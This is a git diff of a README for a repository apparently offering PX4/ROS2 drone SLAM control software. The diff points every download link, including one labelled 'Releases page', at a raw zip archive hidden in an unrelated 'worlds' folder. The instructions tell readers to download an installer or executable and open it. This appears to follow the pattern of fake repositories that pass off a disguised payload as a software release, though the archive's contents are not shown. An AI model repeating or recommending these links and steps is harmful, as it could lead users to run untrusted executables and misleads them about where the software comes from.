@@ -1,6 +1,6 @@
 # 🚀 PX4-ROS2-SLAM-Control - Simplifying UAV Control and Mapping
 
-[![Download](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/Dimaris/PX4-ROS2-SLAM-Control.zip)](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/Dimaris/PX4-ROS2-SLAM-Control.zip)
+[![Download](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/drone_slam_cam/worlds/RO_Control_P_SLA_2.4.zip)](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/drone_slam_cam/worlds/RO_Control_P_SLA_2.4.zip)
 
 ## 📋 Overview
 
@@ -28,14 +28,14 @@ Before you download, ensure your system meets these requirements:
 
 Follow these simple steps to get started with PX4-ROS2-SLAM-Control:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/Dimaris/PX4-ROS2-SLAM-Control.zip) to find the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/drone_slam_cam/worlds/RO_Control_P_SLA_2.4.zip) to find the latest version of the software.
 2. Download the installer or executable file appropriate for your system.
 3. Open the downloaded file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
 
-To download PX4-ROS2-SLAM-Control, visit this page: [Download Here](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/Dimaris/PX4-ROS2-SLAM-Control.zip).
+To download PX4-ROS2-SLAM-Control, visit this page: [Download Here](https://raw.githubusercontent.com/ainolf/PX4-ROS2-SLAM-Control/main/drone_slam_cam/worlds/RO_Control_P_SLA_2.4.zip).
 
 1. Click the link above.
 2. Choose the version that matches your operating system.
